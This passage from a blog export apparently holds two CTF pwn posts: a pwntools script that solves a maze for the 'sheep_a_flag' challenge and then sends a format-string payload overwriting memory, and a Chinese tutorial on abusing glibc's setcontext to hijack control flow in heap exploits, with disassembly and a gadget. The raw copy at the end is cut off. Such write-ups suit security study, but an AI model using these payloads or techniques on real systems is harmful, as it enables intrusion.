class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;node4.buuoj.cn&#x27;,27884)</span></span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./sheep_a_flag&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">\tgdb.attach(p,cmd)</span><br><span class=\"line\">\tpause()</span><br><span class=\"line\"></span><br><span class=\"line\">ans=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">v=[]</span><br><span class=\"line\"><span class=\"built_in\">map</span>=[]</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dfs</span>(<span class=\"params\">res,x,y</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> ans</span><br><span class=\"line\">\t<span class=\"comment\">#print(x,y,flag_x,flag_y,res,sep=&#x27; &#x27;)</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> x==flag_x <span class=\"keyword\">and</span> y==flag_y:</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;you&#x27;</span>)</span><br><span class=\"line\">\t\tans=res</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> x&gt;<span class=\"number\">0</span> <span class=\"keyword\">and</span> <span class=\"built_in\">map</span>[x-<span class=\"number\">1</span>][y]!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> v[x-<span class=\"number\">1</span>][y]!=<span class=\"number\">1</span>:</span><br><span class=\"line\">\t\tv[x-<span class=\"number\">1</span>][y]=<span class=\"number\">1</span></span><br><span class=\"line\">\t\tdfs(res+<span class=\"string\">&#x27;w&#x27;</span>,x-<span class=\"number\">1</span>,y)</span><br><span class=\"line\">\t\tv[x-<span class=\"number\">1</span>][y]=<span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> y&gt;<span class=\"number\">0</span> <span class=\"keyword\">and</span> <span class=\"built_in\">map</span>[x][y-<span class=\"number\">1</span>]!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> v[x][y-<span class=\"number\">1</span>]!=<span class=\"number\">1</span>:</span><br><span class=\"line\">\t\tv[x][y-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">\t\tdfs(res+<span class=\"string\">&#x27;a&#x27;</span>,x,y-<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\tv[x][y-<span class=\"number\">1</span>]=<span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> y&lt;<span class=\"number\">23</span> <span class=\"keyword\">and</span> <span class=\"built_in\">map</span>[x][y+<span class=\"number\">1</span>]!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> v[x][y+<span class=\"number\">1</span>]!=<span class=\"number\">1</span>:</span><br><span class=\"line\">\t\tv[x][y+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">\t\tdfs(res+<span class=\"string\">&#x27;d&#x27;</span>,x,y+<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\tv[x][y+<span class=\"number\">1</span>]=<span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> x&lt;<span class=\"number\">23</span> <span class=\"keyword\">and</span> <span class=\"built_in\">map</span>[x+<span class=\"number\">1</span>][y]!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> v[x+<span class=\"number\">1</span>][y]!=<span class=\"number\">1</span>:</span><br><span class=\"line\">\t\tv[x+<span class=\"number\">1</span>][y]=<span class=\"number\">1</span></span><br><span class=\"line\">\t\tdfs(res+<span class=\"string\">&#x27;s&#x27;</span>,x+<span class=\"number\">1</span>,y)</span><br><span class=\"line\">\t\tv[x+<span class=\"number\">1</span>][y]=<span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> </span><br><span class=\"line\"></span><br><span class=\"line\">sheep_x=-<span class=\"number\">1</span></span><br><span class=\"line\">sheep_y=-<span class=\"number\">1</span></span><br><span class=\"line\">flag_x=-<span class=\"number\">1</span></span><br><span class=\"line\">flag_y=-<span class=\"number\">1</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;position!\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">24</span>):</span><br><span class=\"line\">\tx=[]</span><br><span class=\"line\">\ty=[]</span><br><span class=\"line\">\ta=p.recvline().decode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">24</span>):</span><br><span class=\"line\">\t\ty.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> a[j]==<span class=\"string\">&quot;🈲&quot;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">\t\t\tx.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> a[j]==<span class=\"string\">&#x27;⬛&#x27;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">\t\t\tx.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> a[j]==<span class=\"string\">&#x27;⬜&#x27;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">\t\t\tx.append(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> a[j]==<span class=\"string\">&#x27;🐏&#x27;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">\t\t\tx.append(<span class=\"number\">2</span>)</span><br><span class=\"line\">\t\t\tsheep_x=i</span><br><span class=\"line\">\t\t\tsheep_y=j</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> a[j]==<span class=\"string\">&#x27;🚩&#x27;</span>.decode(<span class=\"string\">&quot;utf-8&quot;</span>):</span><br><span class=\"line\">\t\t\tx.append(<span class=\"number\">3</span>)</span><br><span class=\"line\">\t\t\tflag_x=i</span><br><span class=\"line\">\t\t\tflag_y=j</span><br><span class=\"line\">\t<span class=\"built_in\">map</span>.append(x)</span><br><span class=\"line\">\tv.append(y)</span><br><span class=\"line\">dfs(<span class=\"string\">&#x27;&#x27;</span>,sheep_x,sheep_y)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Ans: \\n&#x27;</span>)</span><br><span class=\"line\">p.sendline(ans)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;it ?!\\n&#x27;</span>)</span><br><span class=\"line\">debug(<span class=\"string\">&#x27;b *0x4011c3&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#overwrite 0x602080 to 0x1D4B42</span></span><br><span class=\"line\"><span class=\"comment\">#0x1D(29) to 0x602082</span></span><br><span class=\"line\"><span class=\"comment\">#0x42(+37) to 0x602080</span></span><br><span class=\"line\"><span class=\"comment\">#0x4B(+9) to 0x602081</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#start from 6</span></span><br><span class=\"line\"><span class=\"comment\">#9 + 9 + 8 + 0x18</span></span><br><span class=\"line\"><span class=\"comment\">#26=&gt;0x18+2=&gt;+2 +2 +2=&gt;0x20=&gt;+4=&gt;6+4=10</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;%29c%10$hhn&#x27;</span>+<span class=\"string\">&#x27;%37c%11$hhn&#x27;</span>+<span class=\"string\">&#x27;%9c%12$hhn&#x27;</span>+p64(<span class=\"number\">0x602082</span>)+p64(<span class=\"number\">0x602080</span>)+p64(<span class=\"number\">0x602081</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"setcontext","date":"2023-01-13T09:37:42.000Z","_content":"\n`setcontext`是`libc`中的一个函数，其中的部分代码可以用来给大部分寄存器进行赋值，不仅可以用于**控制寄存器，还能劫持程序流**，通常在**堆利用并且开启沙箱时用来劫持程序流走`orw`**。\n\n<!--more-->\n\n`setcontext`大致可以把2.27，2.29做为两个分界点。在2.27及以前，`setcontext`**以寄存器`rdi`为基准，对寄存器进行赋值，从`setcontext+53`开始**利用；在2.29及以后，`setcontext`**以寄存器`rdx`为基准，对寄存器进行赋值，并且利用的代码有些许区别，在2.31以后从`setcontext+61`开始**利用。\n\n## glibc-2.27及以前\n\n这里以2.27-3ubuntu1.6_amd64为例：\n\n```asm\n   0x0000000000052050 <+0>:\t\tpush   rdi\n   0x0000000000052051 <+1>:\t\tlea    rsi,[rdi+0x128]\n   0x0000000000052058 <+8>:\t\txor    edx,edx\n   0x000000000005205a <+10>:\tmov    edi,0x2\n   0x000000000005205f <+15>:\tmov    r10d,0x8\n   0x0000000000052065 <+21>:\tmov    eax,0xe\n   0x000000000005206a <+26>:\tsyscall \n   0x000000000005206c <+28>:\tpop    rdi\n   0x000000000005206d <+29>:\tcmp    rax,0xfffffffffffff001\n   0x0000000000052073 <+35>:\tjae    0x520d0 <setcontext+128>\n   0x0000000000052075 <+37>:\tmov    rcx,QWORD PTR [rdi+0xe0]\n   0x000000000005207c <+44>:\tfldenv [rcx]\n   0x000000000005207e <+46>:\tldmxcsr DWORD PTR [rdi+0x1c0]   # 会造成程序执行时直接 crash\n   0x0000000000052085 <+53>:\tmov    rsp,QWORD PTR [rdi+0xa0] # 利用从这里开始\n   0x000000000005208c <+60>:\tmov    rbx,QWORD PTR [rdi+0x80]\n   0x0000000000052093 <+67>:\tmov    rbp,QWORD PTR [rdi+0x78]\n   0x0000000000052097 <+71>:\tmov    r12,QWORD PTR [rdi+0x48]\n   0x000000000005209b <+75>:\tmov    r13,QWORD PTR [rdi+0x50]\n   0x000000000005209f <+79>:\tmov    r14,QWORD PTR [rdi+0x58]\n   0x00000000000520a3 <+83>:\tmov    r15,QWORD PTR [rdi+0x60]\n   0x00000000000520a7 <+87>:\tmov    rcx,QWORD PTR [rdi+0xa8]\t\n   0x00000000000520ae <+94>:\tpush   rcx \t\t\t\t\t   # 这里入栈后ret会ret到该地址\n   0x00000000000520af <+95>:\tmov    rsi,QWORD PTR [rdi+0x70]\n   0x00000000000520b3 <+99>:\tmov    rdx,QWORD PTR [rdi+0x88]\n   0x00000000000520ba <+106>:\tmov    rcx,QWORD PTR [rdi+0x98]\n   0x00000000000520c1 <+113>:\tmov    r8,QWORD PTR [rdi+0x28]\n   0x00000000000520c5 <+117>:\tmov    r9,QWORD PTR [rdi+0x30]\n   0x00000000000520c9 <+121>:\tmov    rdi,QWORD PTR [rdi+0x68]\n   0x00000000000520cd <+125>:\txor    eax,eax\n   0x00000000000520cf <+127>:\tret    \t\t\t\t\t\t   # ret 劫持程序流\n   0x00000000000520d0 <+128>:\tmov    rcx,QWORD PTR [rip+0x398d91]        # 0x3eae68\n   0x00000000000520d7 <+135>:\tneg    eax\n   0x00000000000520d9 <+137>:\tmov    DWORD PTR fs:[rcx],eax\n   0x00000000000520dc <+140>:\tor     rax,0xffffffffffffffff\n   0x00000000000520e0 <+144>:\tret \n```\n\n从`<setcontext+53>~<setcontext+127>`都是我们的利用范围，可以看到这部分代码以 **rdi 寄存器里的地址为基准**设置各个寄存器的值，其中**`push rcx`和后面的`ret`会使得`rip=rcx`**，而且`setcontext`最后会**`xor eax, eax`对`eax`进行赋0**。\n\n大部分题目中通过控制 rsp 和 rip 就可以很好地解决堆题不方便直接控制程序的执行流的问题，可以将`setcontext + 53`写进`__free_hook`或`__malloc_hook`中，然后建立或释放一个`chunk`，此时的`rdi`就会是该`chunk`的（`user_data?`）开头，如果我们提前布局好堆，就意味着我们可以控制寄存器并劫持程序流。\n\n如果需要打`IO`流的话，我们可以将`setcontext + 53`写入`vtable`中，后面执行该`IO`函数时，`rdi`就会是`fp`，指向`IO_FILE`，如果我们伪造好了`IO_FILE`，同样可以劫持程序流。\n\n## glibc-2.29及以后\n\n这里以2.31-0ubuntu9.9_amd64为例：\n\n```asm\n   0x0000000000054f20 <+0>:\t\tendbr64 \n   0x0000000000054f24 <+4>:\t\tpush   rdi\n   0x0000000000054f25 <+5>:\t\tlea    rsi,[rdi+0x128]\n   0x0000000000054f2c <+12>:\txor    edx,edx\n   0x0000000000054f2e <+14>:\tmov    edi,0x2\n   0x0000000000054f33 <+19>:\tmov    r10d,0x8\n   0x0000000000054f39 <+25>:\tmov    eax,0xe\n   0x0000000000054f3e <+30>:\tsyscall \n   0x0000000000054f40 <+32>:\tpop    rdx\n   0x0000000000054f41 <+33>:\tcmp    rax,0xfffffffffffff001\n   0x0000000000054f47 <+39>:\tjae    0x5506f <setcontext+335>\n   0x0000000000054f4d <+45>:\tmov    rcx,QWORD PTR [rdx+0xe0]\n   0x0000000000054f54 <+52>:\tfldenv [rcx]\n   0x0000000000054f56 <+54>:\tldmxcsr DWORD PTR [rdx+0x1c0]\n   0x0000000000054f5d <+61>:\tmov    rsp,QWORD PTR [rdx+0xa0] # 利用从这里开始\n   0x0000000000054f64 <+68>:\tmov    rbx,QWORD PTR [rdx+0x80]\n   0x0000000000054f6b <+75>:\tmov    rbp,QWORD PTR [rdx+0x78]\n   0x0000000000054f6f <+79>:\tmov    r12,QWORD PTR [rdx+0x48]\n   0x0000000000054f73 <+83>:\tmov    r13,QWORD PTR [rdx+0x50]\n   0x0000000000054f77 <+87>:\tmov    r14,QWORD PTR [rdx+0x58]\n   0x0000000000054f7b <+91>:\tmov    r15,QWORD PTR [rdx+0x60]\n   0x0000000000054f7f <+95>:\ttest   DWORD PTR fs:0x48,0x2\n   0x0000000000054f8b <+107>:\tje     0x55046 <setcontext+294> # 这里会跳转走\n   0x0000000000054f91 <+113>:\tmov    rsi,QWORD PTR [rdx+0x3a8]\n   0x0000000000054f98 <+120>:\tmov    rdi,rsi\n   0x0000000000054f9b <+123>:\tmov    rcx,QWORD PTR [rdx+0x3b0]\n   0x0000000000054fa2 <+130>:\tcmp    rcx,QWORD PTR fs:0x78\n   0x0000000000054fab <+139>:\tje     0x54fe5 <setcontext+197>\n   0x0000000000054fad <+141>:\tmov    rax,QWORD PTR [rsi-0x8]\n   0x0000000000054fb1 <+145>:\tand    rax,0xfffffffffffffff8\n   0x0000000000054fb5 <+149>:\tcmp    rax,rsi\n   0x0000000000054fb8 <+152>:\tje     0x54fc0 <setcontext+160>\n   0x0000000000054fba <+154>:\tsub    rsi,0x8\n   0x0000000000054fbe <+158>:\tjmp    0x54fad <setcontext+141>\n   0x0000000000054fc0 <+160>:\tmov    rax,0x1\n   0x0000000000054fc7 <+167>:\tincsspq rax\n   0x0000000000054fcc <+172>:\trstorssp QWORD PTR [rsi-0x8]\n   0x0000000000054fd1 <+177>:\tsaveprevssp \n   0x0000000000054fd5 <+181>:\tmov    rax,QWORD PTR [rdx+0x3b0]\n   0x0000000000054fdc <+188>:\tmov    QWORD PTR fs:0x78,rax\n   0x0000000000054fe5 <+197>:\trdsspq rcx\n   0x0000000000054fea <+202>:\tsub    rcx,rdi\n   0x0000000000054fed <+205>:\tje     0x5500c <setcontext+236>\n   0x0000000000054fef <+207>:\tneg    rcx\n   0x0000000000054ff2 <+210>:\tshr    rcx,0x3\n   0x0000000000054ff6 <+214>:\tmov    esi,0xff\n   0x0000000000054ffb <+219>:\tcmp    rcx,rsi\n   0x0000000000054ffe <+222>:\tcmovb  rsi,rcx\n   0x0000000000055002 <+226>:\tincsspq rsi\n   0x0000000000055007 <+231>:\tsub    rcx,rsi\n   0x000000000005500a <+234>:\tja     0x54ffb <setcontext+219>\n   0x000000000005500c <+236>:\tmov    rsi,QWORD PTR [rdx+0x70]\n   0x0000000000055010 <+240>:\tmov    rdi,QWORD PTR [rdx+0x68]\n   0x0000000000055014 <+244>:\tmov    rcx,QWORD PTR [rdx+0x98]\n   0x000000000005501b <+251>:\tmov    r8,QWORD PTR [rdx+0x28]\n   0x000000000005501f <+255>:\tmov    r9,QWORD PTR [rdx+0x30]\n   0x0000000000055023 <+259>:\tmov    r10,QWORD PTR [rdx+0xa8]\n   0x000000000005502a <+266>:\tmov    rdx,QWORD PTR [rdx+0x88]\n   0x0000000000055031 <+273>:\trdsspq rax\n   0x0000000000055036 <+278>:\tcmp    r10,QWORD PTR [rax]\n   0x0000000000055039 <+281>:\tmov    eax,0x0\n   0x000000000005503e <+286>:\tjne    0x55043 <setcontext+291>\n   0x0000000000055040 <+288>:\tpush   r10\n   0x0000000000055042 <+290>:\tret    \n   0x0000000000055043 <+291>:\tjmp    r10\n   0x0000000000055046 <+294>:\tmov    rcx,QWORD PTR [rdx+0xa8] # 跳转到这里继续\n   0x000000000005504d <+301>:\tpush   rcx\t\t\t\t\t  # 通过push rcx控制rip\n   0x000000000005504e <+302>:\tmov    rsi,QWORD PTR [rdx+0x70]\n   0x0000000000055052 <+306>:\tmov    rdi,QWORD PTR [rdx+0x68]\n   0x0000000000055056 <+310>:\tmov    rcx,QWORD PTR [rdx+0x98]\n   0x000000000005505d <+317>:\tmov    r8,QWORD PTR [rdx+0x28]\n   0x0000000000055061 <+321>:\tmov    r9,QWORD PTR [rdx+0x30]\n   0x0000000000055065 <+325>:\tmov    rdx,QWORD PTR [rdx+0x88]\n   0x000000000005506c <+332>:\txor    eax,eax\n   0x000000000005506e <+334>:\tret    \t\t\t\t\t\t  # 劫持程序流\n   0x000000000005506f <+335>:\tmov    rcx,QWORD PTR [rip+0x196dfa]        # 0x1ebe70\n   0x0000000000055076 <+342>:\tneg    eax\n   0x0000000000055078 <+344>:\tmov    DWORD PTR fs:[rcx],eax\n   0x000000000005507b <+347>:\tor     rax,0xffffffffffffffff\n   0x000000000005507f <+351>:\tret \n```\n\n由于2.29以后是以 **rdx 寄存器里的地址为基准**设置各个寄存器的值，而修改`__free_hook`或者`__malloc_hook`时往往只有一个参数，不能稳定地控制`rdx`，因此我们需要找一个`gadget`帮助我们将`rdi`的值赋给`rdx`。\n\n```asm\nmov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]\n```\n\n这个`gadget`在2.29和2.31中都有，它会将`rdi + 0x8`指向的内容赋值给`rdx`，最后会`call [rdx + 0x20]`。我们可以将这个`gadget`的地址写到`hook`中，并在`chunk+0x8`处写入`rdx`的值，并在`rdx+0x20`处写入`setcontext`。\n\n如果走`IO_FILE`，利用方法也差不多。不过走`_IO_switch_to_wget_mode `的链可以设置`rdx`，具体看`House of Cat`。\n\n## SigreturnFrame\n\n`SigreturnFrame`是`pwntools`中的一个控制寄存器的工具，常用在SROP中，这个工具实际上就是依靠`setcontext`实现的，我们可以用它来构造`setcontext`中的偏移，只需要在调用`setcontext`前将`rdi`或`rdx`指向`SigreturnFrame`，程序在执行`setcontext`时就会按照定义好的内容控制寄存器，用法如下：\n\n```python\nframe = SigreturnFrame()\nframe.rsp = xxx\nframe.rdi = xxx\nframe.rsi = xxx\nframe.rdx = xxx\nframe.rip = xxx\n```\n","source":"_posts/setcontext.md","raw":"---\ntitle: setcontext\ndate: 2023-01-13 17:37:42\ntags: \n- pwn\n- setcontext\ncategories:\n- pwn\n---\n\n`setcontext`是`libc`中的一个函数，其中的部分代码可以用来给大部分寄存器进行赋值，不仅可以用于**控制寄存器，还能劫持程序流**，通常在**堆利用并且开启沙箱时用来劫持程序流走`orw`**。\n\n<!--more-->\n\n`setcontext`大致可以把2.27，2.29做为两个分界点。在2.27及以前，`setcontext`**以寄存器`rdi`为基准，对寄存器进行赋值，从`setcontext+53`开始**利用；在2.29及以后，`setcontext`**以寄存器`rdx`为基准，对寄存器进行赋值，并且利用的代码有些许区别，在2.31以后从`setcontext+61`开始**利用。\n\n## glibc-2.27及以前\n\n这里以2.27-3ubuntu1.6_amd64为例：\n\n```asm\n   0x0000000000052050 <+0>:\t\tpush   rdi\n   0x0000000000052051 <+1>:\t\tlea    rsi,[rdi+0x128]\n   0x0000000000052058 <+8>:\t\txor    edx,edx\n   0x000000000005205a <+10>:\tmov    edi,0x2\n   0x000000000005205f <+15>:\tmov    r10d,0x8\n   0x0000000000052065 <+21>:\tmov    eax,0xe\n   0x000000000005206a <+26>:\tsyscall \n   0x000000000005206c <+28>:\tpop    rdi\n   0x000000000005206d <+29>:\tcmp    rax,0xfffffffffffff001\n   0x0000000000052073 <+35>:\tjae    0x520d0 <setcontext+128>\n   0x0000000000052075 <+37>:\tmov    rcx,QWORD PTR [rdi+0xe0]\n   0x000000000005207c <+44>:\tfldenv [rcx]\n   0x000000000005207e <+46>:\tldmxcsr DWORD PTR [rdi+0x1c0]   # 会造成程序执行时直接 crash\n   0x0000000000052085 <+53>:\tmov    rsp,QWORD PTR [rdi+0xa0] # 利用从这里开始\n   0x000000000005208c <+60>:\tmov    rbx,QWORD PTR [rdi+0x80]\n   0x0000000000052093 <+67>:\tmov    rbp,QWORD PTR [rdi+0x78]\n   0x0000000000052097 <+71>:\tmov    r12,QWORD PTR [rdi+0x48]\n   0x000000000005209b <+75>:\tmov    r13,QWORD PTR [rdi+0x50]\n   0x000000000005209f <+79>:\tmov    r14,QWORD PTR [rdi+0x58]\n   0x00000000000520a3 <+83>:\tmov    r15,QWORD PTR [rdi+0x60]\n   0x00000000000520a7 <+87>:\tmov    rcx,QWORD PTR [rdi+0xa8]\t\n   0x00000000000520ae <+94>:\tpush   rcx \t\t\t\t\t   # 这里入栈后ret会ret到该地址\n   0x00000000000520af <+95>:\tmov    rsi,QWORD PTR [rdi+0x70]\n   0x00000000000520b3 <+99>:\tmov    rdx,QWORD PTR [rdi+0x88]\n   0x00000000000520ba <+106>:\tmov    rcx,QWORD PTR [rdi+0x98]\n   0x00000000000520c1 <+113>:\tmov    r8,QWORD PTR [rdi+0x28]\n   0x00000000000520c5 <+117>:\tmov    r9,QWORD PTR [rdi+0x30]\n   0x00000000000520c9 <+121>:\tmov    rdi,QWORD PTR [rdi+0x68]\n   0x00000000000520cd <+125>:\txor    eax,eax\n   0x00000000000520cf <+127>:\tret    \t\t\t\t\t\t   # ret 劫持程序流\n   0x00000000000520d0 <+128>:\tmov    rcx,QWORD PTR [rip+0x398d91]        # 0x3eae68\n   0x00000000000520d7 <+135>:\tneg    eax\n   0x00000000000520d9 <+137>:\tmov    DWORD PTR fs:[rcx],eax\n   0x00000000000520dc <+140>:\tor     rax,0xffffffffffffffff\n   0x00000000000520e0 <+144>:\tret \n```\n\n从`<setcontext+53>~<setcontext+127>`都是我们的利用范围，可以看到这部分代码以 **rdi 寄存器里的地址为基准**设置各个寄存器的值，其中**`push rcx`和后面的`ret`会使得`rip=rcx`**，而且`setcontext`最后会**`xor eax, eax`对`eax`进行赋0**。\n\n大部分题目中通过控制 rsp 和 rip 就可以很好地解决堆题不方便直接控制程序的执行流的问题，可以将`setcontext + 53`写进`__free_hook`或`__malloc_hook`中，然后建立或释放一个`chunk`，此时的`rdi`就会是该`chunk`的（`user_data?`）开头，如果我们提前布局好堆，就意味着我们可以控制寄存器并劫持程序流。\n\n如果需要打`IO`流的话，我们可以将`setcontext + 53`写入`vtable`中，后面执行该`IO`函数时，`rdi`就会是`fp`，指向`IO_FILE`，如果我们伪造好了`IO_FILE`，同样可以劫持程序流。\n\n## glibc-2.29及以后\n\n这里以2.31-0ubuntu9.9_amd64为例：\n\n```asm\n   0x0000000000054f20 <+0>:\t\tendbr64 \n   0x0000000000054f24 <+4>:\t\tpush   rdi\n   0x0000000000054f25 <+5>:\t\tlea    rsi,[rdi+0x128]\n   0x0000000000054f2c <+12>:\txor    edx,edx\n   0x0000000000054f2e <+14>:\tmov    edi,0x2\n   0x0000000000054f33 <+19>:\tmov    r10d,0x8\n   0x0000000000054f39 <+25>:\tmov    eax,0xe\n   0x0000000000054f3e <+30>:\tsyscall \n   0x0000000000054f40 <+32>:\tpop    rdx\n   0x0000000000054f41 <+33>:\tcmp    rax,0xfffffffffffff001\n   0x0000000000054f47 <+39>:\tjae    0x5506f <setcontext+335>\n   0x0000000000054f4d <+45>:\tmov    rcx,QWORD PTR [rdx+0xe0]\n   0x0000000000054f54 <+52>:\tfldenv [rcx]\n   0x0000000000054f56 <+54>:\tldmxcsr DWORD PTR [rdx+0x1c0]\n   0x0000000000054f5d <+61>:\tmov    rsp,QWORD PTR [rdx+0xa0] # 利用从这里开始\n   0x0000000000054f64 <+68>:\tmov    rbx,QWORD PTR [rdx+0x80]\n   0x0000000000054f6b <+75>:\tmov    rbp,QWORD PTR [rdx+0x78]\n   0x0000000000054f6f <+79>:\tmov    r12,QWORD PTR [rdx+0x48]\n   0x0000000000054f73 <+83>:\tmov    r13,QWORD PTR [rdx+0x50]\n   0x0000000000054f77 <+87>:\tmov    r14,QWORD PTR [rdx+0x58]\n   0x0000000000054f7b <+91>:\tmov    r15,QWORD PTR [rdx+0x60]\n   0x0000000000054f7f <+95>:\ttest   DWORD PTR fs:0x48,0x2\n   0x0000000000054f8b <+107>:\tje     0x55046 <setcontext+294> # 这里会跳转走\n   0x0000000000054f91 <+113>:\tmov    rsi,QWORD PTR [rdx+0x3a8]\n   0x0000000000054f98 <+120>:\tmov    rdi,rsi\n   0x0000000000054f9b <+123>:\tmov    rcx,QWORD PTR [rdx+0x3b0]\n   0x0000000000054fa2 <+130>:\tcmp    rcx,QWORD PTR fs:0x78\n   0x0000000000054fab <+139>:\tje     0x54fe5 <setcontext+197>\n   0x0000000000054fad <+141>:\tmov    rax,QWORD PTR [rsi-0x8]\n   0x0000000000054fb1 <+145>:\tand    rax,0xfffffffffffffff8\n   0x0000000000054fb5 <+149>:\tcmp    rax,rsi\n   0x0000000000054fb8 <+152>:\tje     0x54fc0 <setcontext+160>\n   0x0000000000054fba <+154>:\tsub    rsi,0x8\n   0x0000000000054fbe <+158>:\tjmp    0x54fad <setcontext+141>\n   0x0000000000054fc0 <+160>:\tmov    rax,0x1\n   0x0000000000054fc7 <+167>:\tincsspq rax\n   0x0000000000054fcc <+172>:\trstorssp QWORD PTR [rsi-0x8]\n   0x0000000000054fd1 <+177>:\tsaveprevssp \n   0x0000000000054fd5 <+181>:\tmov    rax,QWORD PTR [rdx+0x3b0]\n   0x0000000000054fdc <+188>:\tmov    QWORD PTR fs:0x78,rax\n   0x0000000000054fe5 <+197>:\trdsspq rcx\n   0x0000000000054fea <+202>:\tsub    rcx,rdi\n   0x0000000000054fed <+205>:\tje     0x5500c <setcontext+236>\n   0x0000000000054fef <+207>:\tneg    rcx\n   0x0000000000054ff2 <+210>:\tshr    rcx,0x3\n   0x0000000000054ff6 <+214>:\tmov    esi,0xff\n   0x0000000000054ffb <+219>:\tcmp    rcx,rsi\n   0x0000000000054ffe <+222>:\tcmovb  rsi,rcx\n   0x0000000000055002 <+226>:\tincsspq rsi\n   0x0000000000055007 <+231>:\tsub    rcx,rsi\n   0x000000000005500a <+234>:\tja     0x54ffb <setcontext+219>\n   0x000000000005500c <+236>:\tmov    rsi,QWORD PTR [rdx+0x70]\n   0x0000000000055010 <+240>:\tmov    rdi,QWORD PTR [rdx+0x68]\n   0x0000000000055014 <+244>:\tmov    rcx,QWORD PTR [rdx+0x98]\n   0x000000000005501b <+251>:\tmov    r8,QWORD PTR [rdx+0x28]\n   0x000000000005501f <+255>:\tmov    r9,QWORD PTR [rdx+0x30]\n   0x0000000000055023 <+259>:\tmov    r10,QWORD PTR [rdx+0xa8]\n   0x000000000005502a <+266>:\tmov    